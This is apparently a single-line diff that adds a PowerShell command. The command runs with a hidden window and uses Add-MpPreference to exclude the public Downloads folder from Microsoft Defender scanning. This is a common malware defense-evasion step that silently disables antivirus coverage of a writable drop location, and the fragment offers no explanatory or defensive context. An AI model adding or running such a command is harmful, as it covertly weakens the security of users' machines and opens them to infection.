@@ -1,0 +1,1 @@
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
